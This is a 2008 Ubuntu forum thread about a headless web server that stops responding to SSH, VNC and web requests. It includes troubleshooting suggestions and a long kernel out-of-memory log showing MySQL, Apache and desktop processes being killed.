---
title: "[SOLVED] Server not responding to and type of remote access"
date: 2008-10-04
forum: General Help
---

### Post by murbanci on 2008-10-04
I am running Ubuntu on a headless system and am using mainly as a web server for my Air Force ROTC Detachment (this is not the system in my signature).  Yesterday, it started not responding.  The website was not accessible and I was unable to VNC or SSH into the system, both were working earlier.  I dont believe there were any updates that have been installed and no new software has been installed.  I noticed there was a problem with MySQL not starting on boot however this should not have any affect on VNC or SSH.  Any ideas?  Thanks for any help.

---

### Post by taladan on 2008-10-04
sounds like the server may have restarted and hung on post with a Keyboard error.  Hook up a monitor & keyboard to it and check, if that's the case, go into the bios and disable stop on errors for the keyboard.

Had this happen to me a couple of days back with a machine I run on a KVM and could not for the life of me figure out why until I physically switched over to the machine (i'd kicked the kb plug out of the KVM as it was rebooting apparently).

Hope this helps,

Tal

---

### Post by murbanci on 2008-10-06
I checked this and it doesnt seam to be a problem.  I made sure that the BIOS did not check for a keyboard in POST.  It was working fine this morning after I checked the BIOS and restarted.  Now it is not responding again.  Cant log in through SSH and the web site is not loading.

Im not sure how this would be connected but for some reason the MySQL server stopped also.  Earlier, while the site was still up and I could log in I noticed this and restarted it and everything once again seamed fine.

Let know if you have any ideas.  Ive done all I can think of which isnt much lol.

---

### Post by geirha on 2008-10-06
It sounds odd to me that it would stop responding this way just suddenly. I would suggest you ssh into it and run ```
tail -f /var/log/syslog
``` which will keep outputting the contents of syslog indefinately. If it goes down again, you might get some clue from the last lines of that log.

---

### Post by murbanci on 2008-10-06
I looked through the syslog and noticed the following for several services:
```
Oct  6 13:19:44 afrotc-server kernel: [12541.332176] Out of memory: kill process 4926 (mysqld) score 32031 or a child
Oct  6 13:19:44 afrotc-server kernel: [12541.332222] Killed process 4926 (mysqld)
Oct  6 13:19:44 afrotc-server kernel: [12541.403664]    invoked oom-killer: gfp_mask=0x40d0, order=1, oomkilladj=0
Oct  6 13:19:44 afrotc-server kernel: [12541.403670] Pid: 6575, comm:    Not tainted 2.6.24-19-generic #1
Oct  6 13:19:44 afrotc-server kernel: [12541.403683]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:19:44 afrotc-server kernel: [12541.403692]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:19:44 afrotc-server kernel: [12541.403697]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:19:44 afrotc-server kernel: [12541.403704]  [__slab_alloc+0x17a/0x4a0] __slab_alloc+0x17a/0x4a0
Oct  6 13:19:44 afrotc-server kernel: [12541.403709]  [ipv6:kmem_cache_alloc+0xad/0xc0] kmem_cache_alloc+0xad/0xc0
Oct  6 13:19:44 afrotc-server kernel: [12541.403712]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:19:44 afrotc-server kernel: [12541.403718]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:19:44 afrotc-server kernel: [12541.403723]  [ipv6:sk_alloc+0x2a/0x190] sk_alloc+0x2a/0x70
Oct  6 13:19:44 afrotc-server kernel: [12541.403726]  [inet_create+0x134/0x330] inet_create+0x134/0x330
Oct  6 13:19:44 afrotc-server kernel: [12541.403731]  [sock_alloc_inode+0x20/0x50] sock_alloc_inode+0x20/0x50
Oct  6 13:19:44 afrotc-server kernel: [12541.403736]  [__sock_create+0xcf/0x1f0] __sock_create+0xcf/0x1f0
Oct  6 13:19:44 afrotc-server kernel: [12541.403739]  [destroy_inode+0x27/0x40] destroy_inode+0x27/0x40
Oct  6 13:19:44 afrotc-server kernel: [12541.403743]  [sock_create+0x3a/0x50] sock_create+0x3a/0x50
Oct  6 13:19:44 afrotc-server kernel: [12541.403747]  [sys_socket+0x1c/0x50] sys_socket+0x1c/0x50
Oct  6 13:19:44 afrotc-server kernel: [12541.403750]  [sys_socketcall+0x2a1/0x2b0] sys_socketcall+0x2a1/0x2b0
Oct  6 13:19:44 afrotc-server kernel: [12541.403755]  [do_exit+0x46b/0x860] do_exit+0x46b/0x860
Oct  6 13:19:44 afrotc-server kernel: [12541.403758]  [ipi_handler+0xb/0x90] ipi_handler+0xb/0x90
Oct  6 13:19:44 afrotc-server kernel: [12541.403762]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:19:44 afrotc-server kernel: [12541.403769]  =======================
Oct  6 13:19:44 afrotc-server kernel: [12541.403770] Mem-info:
Oct  6 13:19:44 afrotc-server kernel: [12541.403771] DMA per-cpu:
Oct  6 13:19:44 afrotc-server kernel: [12541.403773] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403776] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403778] Normal per-cpu:
Oct  6 13:19:44 afrotc-server kernel: [12541.403779] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403782] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403784] HighMem per-cpu:
Oct  6 13:19:44 afrotc-server kernel: [12541.403785] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403788] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:44 afrotc-server kernel: [12541.403791] Active:41740 inactive:23800 dirty:0 writeback:0 unstable:0
Oct  6 13:19:44 afrotc-server kernel: [12541.403792]  free:229430 slab:128396 mapped:9382 pagetables:1013 bounce:0
Oct  6 13:19:44 afrotc-server kernel: [12541.403795] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:44 afrotc-server kernel: [12541.403797] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:19:44 afrotc-server kernel: [12541.403801] Normal free:6328kB min:3744kB low:4680kB high:5616kB active:116kB inactive:12kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:44 afrotc-server kernel: [12541.403804] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:19:44 afrotc-server kernel: [12541.403808] HighMem free:907852kB min:512kB low:1736kB high:2960kB active:166844kB inactive:95188kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:44 afrotc-server kernel: [12541.403810] lowmem_reserve[]: 0 0 0 0
Oct  6 13:19:44 afrotc-server kernel: [12541.403813] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:19:44 afrotc-server kernel: [12541.403821] Normal: 1114*4kB 13*8kB 1*16kB 0*32kB 0*64kB 0*128kB 1*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6368kB
Oct  6 13:19:44 afrotc-server kernel: [12541.403827] HighMem: 1871*4kB 1716*8kB 1213*16kB 875*32kB 566*64kB 248*128kB 83*256kB 61*512kB 24*1024kB 9*2048kB 165*4096kB = 907916kB
Oct  6 13:19:44 afrotc-server kernel: [12541.403836] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:19:44 afrotc-server kernel: [12541.403837] Free swap  = 3229024kB
Oct  6 13:19:44 afrotc-server kernel: [12541.403838] Total swap = 3229024kB
Oct  6 13:19:44 afrotc-server kernel: [12541.403840] Free swap:       3229024kB
Oct  6 13:19:44 afrotc-server kernel: [12541.408268] 523900 pages of RAM
Oct  6 13:19:44 afrotc-server kernel: [12541.408270] 294524 pages of HIGHMEM
Oct  6 13:19:44 afrotc-server kernel: [12541.408271] 5350 reserved pages
Oct  6 13:19:44 afrotc-server kernel: [12541.408272] 167707 pages shared
Oct  6 13:19:44 afrotc-server kernel: [12541.408273] 0 pages swap cached
Oct  6 13:19:44 afrotc-server kernel: [12541.408275] 0 pages dirty
Oct  6 13:19:44 afrotc-server kernel: [12541.408276] 0 pages writeback
Oct  6 13:19:44 afrotc-server kernel: [12541.408277] 9382 pages mapped
Oct  6 13:19:44 afrotc-server kernel: [12541.408278] 128396 pages slab
Oct  6 13:19:44 afrotc-server kernel: [12541.408279] 1013 pages pagetables
Oct  6 13:19:44 afrotc-server kernel: [12541.408282] Out of memory: kill process 5662 (x-session-manag) score 26980 or a child
Oct  6 13:19:44 afrotc-server kernel: [12541.408328] Killed process 6147 (trackerd)
Oct  6 13:19:45 afrotc-server kernel: [12542.035192] Out of memory: kill process 5662 (x-session-manag) score 15499 or a child
Oct  6 13:19:45 afrotc-server kernel: [12542.035213] Killed process 6151 (python)
Oct  6 13:19:47 afrotc-server kernel: [12544.047029] printk: 1 messages suppressed.
Oct  6 13:19:47 afrotc-server kernel: [12544.047035]    invoked oom-killer: gfp_mask=0x40d0, order=1, oomkilladj=0
Oct  6 13:19:47 afrotc-server kernel: [12544.047038] Pid: 6788, comm:    Not tainted 2.6.24-19-generic #1
Oct  6 13:19:47 afrotc-server kernel: [12544.047051]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:19:47 afrotc-server kernel: [12544.047060]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:19:47 afrotc-server kernel: [12544.047065]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:19:47 afrotc-server kernel: [12544.047068]  [enqueue_task_fair+0x27/0x30] enqueue_task_fair+0x27/0x30
Oct  6 13:19:47 afrotc-server kernel: [12544.047073]  [enqueue_task+0x12/0x30] enqueue_task+0x12/0x30
Oct  6 13:19:47 afrotc-server kernel: [12544.047078]  [__slab_alloc+0x17a/0x4a0] __slab_alloc+0x17a/0x4a0
Oct  6 13:19:47 afrotc-server kernel: [12544.047084]  [ipv6:kmem_cache_alloc+0xad/0xc0] kmem_cache_alloc+0xad/0xc0
Oct  6 13:19:47 afrotc-server kernel: [12544.047087]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:19:47 afrotc-server kernel: [12544.047092]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:19:47 afrotc-server kernel: [12544.047096]  [ipv6:sk_alloc+0x2a/0x190] sk_alloc+0x2a/0x70
Oct  6 13:19:47 afrotc-server kernel: [12544.047100]  [inet_create+0x134/0x330] inet_create+0x134/0x330
Oct  6 13:19:47 afrotc-server kernel: [12544.047104]  [sock_alloc_inode+0x20/0x50] sock_alloc_inode+0x20/0x50
Oct  6 13:19:47 afrotc-server kernel: [12544.047109]  [__sock_create+0xcf/0x1f0] __sock_create+0xcf/0x1f0
Oct  6 13:19:47 afrotc-server kernel: [12544.047112]  [destroy_inode+0x27/0x40] destroy_inode+0x27/0x40
Oct  6 13:19:47 afrotc-server kernel: [12544.047117]  [sock_create+0x3a/0x50] sock_create+0x3a/0x50
Oct  6 13:19:47 afrotc-server kernel: [12544.047120]  [sys_socket+0x1c/0x50] sys_socket+0x1c/0x50
Oct  6 13:19:47 afrotc-server kernel: [12544.047124]  [sys_socketcall+0x2a1/0x2b0] sys_socketcall+0x2a1/0x2b0
Oct  6 13:19:47 afrotc-server kernel: [12544.047128]  [irq_exit+0x51/0x80] irq_exit+0x51/0x80
Oct  6 13:19:47 afrotc-server kernel: [12544.047131]  [smp_apic_timer_interrupt+0x55/0x80] smp_apic_timer_interrupt+0x55/0x80
Oct  6 13:19:47 afrotc-server kernel: [12544.047137]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:19:47 afrotc-server kernel: [12544.047143]  =======================
Oct  6 13:19:47 afrotc-server kernel: [12544.047145] Mem-info:
Oct  6 13:19:47 afrotc-server kernel: [12544.047146] DMA per-cpu:
Oct  6 13:19:47 afrotc-server kernel: [12544.047148] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047151] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047152] Normal per-cpu:
Oct  6 13:19:47 afrotc-server kernel: [12544.047154] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047156] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047158] HighMem per-cpu:
Oct  6 13:19:47 afrotc-server kernel: [12544.047160] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047162] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:47 afrotc-server kernel: [12544.047165] Active:35353 inactive:18326 dirty:3 writeback:0 unstable:0
Oct  6 13:19:47 afrotc-server kernel: [12544.047166]  free:241345 slab:128324 mapped:8522 pagetables:999 bounce:0
Oct  6 13:19:47 afrotc-server kernel: [12544.047169] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:47 afrotc-server kernel: [12544.047171] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:19:47 afrotc-server kernel: [12544.047176] Normal free:6532kB min:3744kB low:4680kB high:5616kB active:92kB inactive:24kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:47 afrotc-server kernel: [12544.047178] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:19:47 afrotc-server kernel: [12544.047182] HighMem free:955308kB min:512kB low:1736kB high:2960kB active:141320kB inactive:73280kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:47 afrotc-server kernel: [12544.047184] lowmem_reserve[]: 0 0 0 0
Oct  6 13:19:47 afrotc-server kernel: [12544.047187] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:19:47 afrotc-server kernel: [12544.047195] Normal: 1171*4kB 16*8kB 1*16kB 1*32kB 1*64kB 1*128kB 0*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6588kB
Oct  6 13:19:47 afrotc-server kernel: [12544.047202] HighMem: 1873*4kB 1734*8kB 1235*16kB 909*32kB 605*64kB 297*128kB 124*256kB 77*512kB 26*1024kB 15*2048kB 166*4096kB = 955396kB
Oct  6 13:19:47 afrotc-server kernel: [12544.047210] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:19:47 afrotc-server kernel: [12544.047212] Free swap  = 3229024kB
Oct  6 13:19:47 afrotc-server kernel: [12544.047213] Total swap = 3229024kB
Oct  6 13:19:47 afrotc-server kernel: [12544.047214] Free swap:       3229024kB
Oct  6 13:19:47 afrotc-server kernel: [12544.051883] 523900 pages of RAM
Oct  6 13:19:47 afrotc-server kernel: [12544.051885] 294524 pages of HIGHMEM
Oct  6 13:19:47 afrotc-server kernel: [12544.051887] 5350 reserved pages
Oct  6 13:19:47 afrotc-server kernel: [12544.051888] 161160 pages shared
Oct  6 13:19:47 afrotc-server kernel: [12544.051889] 0 pages swap cached
Oct  6 13:19:47 afrotc-server kernel: [12544.051890] 3 pages dirty
Oct  6 13:19:47 afrotc-server kernel: [12544.051891] 0 pages writeback
Oct  6 13:19:47 afrotc-server kernel: [12544.051893] 8522 pages mapped
Oct  6 13:19:47 afrotc-server kernel: [12544.051894] 128324 pages slab
Oct  6 13:19:47 afrotc-server kernel: [12544.051895] 999 pages pagetables
Oct  6 13:19:47 afrotc-server kernel: [12544.051897] Out of memory: kill process 5662 (x-session-manag) score 12728 or a child
Oct  6 13:19:47 afrotc-server kernel: [12544.051942] Killed process 6156 (nm-applet)
Oct  6 13:19:47 afrotc-server kernel: [12544.674657] Out of memory: kill process 6057 (bonobo-activati) score 10301 or a child
Oct  6 13:19:47 afrotc-server kernel: [12544.674678] Killed process 6057 (bonobo-activati)
Oct  6 13:19:48 afrotc-server kernel: [12545.450890] Out of memory: kill process 5662 (x-session-manag) score 9774 or a child
Oct  6 13:19:48 afrotc-server kernel: [12545.450912] Killed process 7446 (gnome-settings-)
Oct  6 13:19:49 afrotc-server kernel: [12546.217773] Out of memory: kill process 5652 (apache2) score 8320 or a child
Oct  6 13:19:49 afrotc-server kernel: [12546.217793] Killed process 5652 (apache2)
Oct  6 13:19:49 afrotc-server kernel: [12546.777467] Out of memory: kill process 6257 (apache2) score 7543 or a child
Oct  6 13:19:49 afrotc-server kernel: [12546.777488] Killed process 6257 (apache2)
Oct  6 13:19:50 afrotc-server kernel: [12546.900989] Out of memory: kill process 6259 (apache2) score 7282 or a child
Oct  6 13:19:50 afrotc-server kernel: [12546.901011] Killed process 6259 (apache2)
Oct  6 13:19:50 afrotc-server kernel: [12547.417086] Out of memory: kill process 6131 (gvfs-fuse-daemo) score 7262 or a child
Oct  6 13:19:50 afrotc-server kernel: [12547.417106] Killed process 6131 (gvfs-fuse-daemo)
Oct  6 13:19:51 afrotc-server kernel: [12548.171663] Out of memory: kill process 5662 (x-session-manag) score 8999 or a child
Oct  6 13:19:51 afrotc-server kernel: [12548.171683] Killed process 7452 (metacity)
Oct  6 13:19:52 afrotc-server kernel: [12548.883242] printk: 7 messages suppressed.
Oct  6 13:19:52 afrotc-server kernel: [12548.883247] x-session-manag invoked oom-killer: gfp_mask=0xd0, order=1, oomkilladj=0
Oct  6 13:19:52 afrotc-server kernel: [12548.883250] Pid: 5662, comm: x-session-manag Not tainted 2.6.24-19-generic #1
Oct  6 13:19:52 afrotc-server kernel: [12548.883265]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:19:52 afrotc-server kernel: [12548.883273]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:19:52 afrotc-server kernel: [12548.883279]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:19:52 afrotc-server kernel: [12548.883286]  [ext3:__get_free_pages+0x37/0x820] __get_free_pages+0x37/0x50
Oct  6 13:19:52 afrotc-server kernel: [12548.883289]  [copy_process+0xa6/0x11f0] copy_process+0xa6/0x11f0
Oct  6 13:19:52 afrotc-server kernel: [12548.883292]  [<c0140c40>] autoremove_wake_function+0x0/0x40
Oct  6 13:19:52 afrotc-server kernel: [12548.883298]  [inotify_d_instantiate+0x18/0x80] inotify_d_instantiate+0x18/0x80
Oct  6 13:19:52 afrotc-server kernel: [12548.883304]  [do_fork+0x40/0x260] do_fork+0x40/0x260
Oct  6 13:19:52 afrotc-server kernel: [12548.883307]  [do_pipe+0x7c/0xf0] do_pipe+0x7c/0xf0
Oct  6 13:19:52 afrotc-server kernel: [12548.883311]  [sys_clone+0x36/0x40] sys_clone+0x36/0x40
Oct  6 13:19:52 afrotc-server kernel: [12548.883315]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:19:52 afrotc-server kernel: [12548.883320]  [unix_stream_sendmsg+0x110/0x390] unix_stream_sendmsg+0x110/0x390
Oct  6 13:19:52 afrotc-server kernel: [12548.883325]  =======================
Oct  6 13:19:52 afrotc-server kernel: [12548.883327] Mem-info:
Oct  6 13:19:52 afrotc-server kernel: [12548.883328] DMA per-cpu:
Oct  6 13:19:52 afrotc-server kernel: [12548.883330] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883332] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883334] Normal per-cpu:
Oct  6 13:19:52 afrotc-server kernel: [12548.883336] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883338] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883340] HighMem per-cpu:
Oct  6 13:19:52 afrotc-server kernel: [12548.883342] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883344] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:52 afrotc-server kernel: [12548.883347] Active:27270 inactive:18306 dirty:0 writeback:0 unstable:0
Oct  6 13:19:52 afrotc-server kernel: [12548.883348]  free:249536 slab:128319 mapped:8104 pagetables:922 bounce:0
Oct  6 13:19:52 afrotc-server kernel: [12548.883351] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:52 afrotc-server kernel: [12548.883354] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:19:52 afrotc-server kernel: [12548.883358] Normal free:6484kB min:3744kB low:4680kB high:5616kB active:108kB inactive:44kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:52 afrotc-server kernel: [12548.883360] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:19:52 afrotc-server kernel: [12548.883364] HighMem free:988120kB min:512kB low:1736kB high:2960kB active:108972kB inactive:73180kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:52 afrotc-server kernel: [12548.883367] lowmem_reserve[]: 0 0 0 0
Oct  6 13:19:52 afrotc-server kernel: [12548.883370] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:19:52 afrotc-server kernel: [12548.883377] Normal: 1170*4kB 9*8kB 1*16kB 1*32kB 1*64kB 1*128kB 0*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6528kB
Oct  6 13:19:52 afrotc-server kernel: [12548.883384] HighMem: 2226*4kB 1876*8kB 1387*16kB 972*32kB 657*64kB 352*128kB 152*256kB 85*512kB 30*1024kB 15*2048kB 166*4096kB = 988120kB
Oct  6 13:19:52 afrotc-server kernel: [12548.883393] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:19:52 afrotc-server kernel: [12548.883394] Free swap  = 3229024kB
Oct  6 13:19:52 afrotc-server kernel: [12548.883395] Total swap = 3229024kB
Oct  6 13:19:52 afrotc-server kernel: [12548.883397] Free swap:       3229024kB
Oct  6 13:19:52 afrotc-server kernel: [12548.887802] 523900 pages of RAM
Oct  6 13:19:52 afrotc-server kernel: [12548.887804] 294524 pages of HIGHMEM
Oct  6 13:19:52 afrotc-server kernel: [12548.887806] 5350 reserved pages
Oct  6 13:19:52 afrotc-server kernel: [12548.887807] 152605 pages shared
Oct  6 13:19:52 afrotc-server kernel: [12548.887808] 0 pages swap cached
Oct  6 13:19:52 afrotc-server kernel: [12548.887809] 0 pages dirty
Oct  6 13:19:52 afrotc-server kernel: [12548.887810] 0 pages writeback
Oct  6 13:19:52 afrotc-server kernel: [12548.887811] 8104 pages mapped
Oct  6 13:19:52 afrotc-server kernel: [12548.887812] 128319 pages slab
Oct  6 13:19:52 afrotc-server kernel: [12548.887813] 922 pages pagetables
Oct  6 13:19:52 afrotc-server kernel: [12548.887816] Out of memory: kill process 5662 (x-session-manag) score 7197 or a child
Oct  6 13:19:52 afrotc-server kernel: [12548.887859] Killed process 5662 (x-session-manag)
Oct  6 13:19:52 afrotc-server kernel: [12549.051465] Out of memory: kill process 6186 (fast-user-switc) score 6351 or a child
Oct  6 13:19:52 afrotc-server kernel: [12549.051488] Killed process 6186 (fast-user-switc)
Oct  6 13:19:53 afrotc-server kernel: [12549.902657] Out of memory: kill process 6063 (vino-server) score 6128 or a child
Oct  6 13:19:53 afrotc-server kernel: [12549.902675] Killed process 6063 (vino-server)
Oct  6 13:19:53 afrotc-server kernel: [12549.906884] Out of memory: kill process 7354 (apache2) score 6122 or a child
Oct  6 13:19:53 afrotc-server kernel: [12549.906901] Killed process 7354 (apache2)
Oct  6 13:19:54 afrotc-server kernel: [12551.006185] Out of memory: kill process 6937 (apache2) score 5991 or a child
Oct  6 13:19:54 afrotc-server kernel: [12551.006202] Killed process 6937 (apache2)
Oct  6 13:19:55 afrotc-server kernel: [12551.809592] Out of memory: kill process 6258 (apache2) score 5984 or a child
Oct  6 13:19:55 afrotc-server kernel: [12551.809609] Killed process 6258 (apache2)
Oct  6 13:19:55 afrotc-server mysqld_safe[7457]: Number of processes running now: 0
Oct  6 13:19:56 afrotc-server kernel: [12553.276706] Out of memory: kill process 6683 (apache2) score 5966 or a child
Oct  6 13:19:56 afrotc-server kernel: [12553.276724] Killed process 6683 (apache2)
Oct  6 13:19:57 afrotc-server kernel: [12553.921055] printk: 6 messages suppressed.
Oct  6 13:19:57 afrotc-server kernel: [12553.921060] apache2 invoked oom-killer: gfp_mask=0xd0, order=1, oomkilladj=0
Oct  6 13:19:57 afrotc-server kernel: [12553.921063] Pid: 5558, comm: apache2 Not tainted 2.6.24-19-generic #1
Oct  6 13:19:57 afrotc-server kernel: [12553.921077]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:19:57 afrotc-server kernel: [12553.921086]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:19:57 afrotc-server kernel: [12553.921091]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:19:57 afrotc-server kernel: [12553.921098]  [ext3:__get_free_pages+0x37/0x820] __get_free_pages+0x37/0x50
Oct  6 13:19:57 afrotc-server kernel: [12553.921101]  [copy_process+0xa6/0x11f0] copy_process+0xa6/0x11f0
Oct  6 13:19:57 afrotc-server kernel: [12553.921105]  [fuse:remove_wait_queue+0x13/0x40] remove_wait_queue+0x13/0x40
Oct  6 13:19:57 afrotc-server kernel: [12553.921109]  [do_wait+0x413/0xba0] do_wait+0x413/0xba0
Oct  6 13:19:57 afrotc-server kernel: [12553.921115]  [do_fork+0x40/0x260] do_fork+0x40/0x260
Oct  6 13:19:57 afrotc-server kernel: [12553.921120]  [sys_clone+0x36/0x40] sys_clone+0x36/0x40
Oct  6 13:19:57 afrotc-server kernel: [12553.921124]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:19:57 afrotc-server kernel: [12553.921128]  [unix_stream_sendmsg+0x110/0x390] unix_stream_sendmsg+0x110/0x390
Oct  6 13:19:57 afrotc-server kernel: [12553.921134]  =======================
Oct  6 13:19:57 afrotc-server kernel: [12553.921135] Mem-info:
Oct  6 13:19:57 afrotc-server kernel: [12553.921137] DMA per-cpu:
Oct  6 13:19:57 afrotc-server kernel: [12553.921139] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921141] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921143] Normal per-cpu:
Oct  6 13:19:57 afrotc-server kernel: [12553.921145] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921147] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921149] HighMem per-cpu:
Oct  6 13:19:57 afrotc-server kernel: [12553.921151] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921153] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:19:57 afrotc-server kernel: [12553.921156] Active:23228 inactive:18105 dirty:3 writeback:0 unstable:0
Oct  6 13:19:57 afrotc-server kernel: [12553.921157]  free:253835 slab:128305 mapped:7218 pagetables:849 bounce:0
Oct  6 13:19:57 afrotc-server kernel: [12553.921160] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:57 afrotc-server kernel: [12553.921163] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:19:57 afrotc-server kernel: [12553.921167] Normal free:6468kB min:3744kB low:4680kB high:5616kB active:72kB inactive:0kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:57 afrotc-server kernel: [12553.921169] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:19:57 afrotc-server kernel: [12553.921173] HighMem free:1005332kB min:512kB low:1736kB high:2960kB active:92840kB inactive:72420kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:19:57 afrotc-server kernel: [12553.921176] lowmem_reserve[]: 0 0 0 0
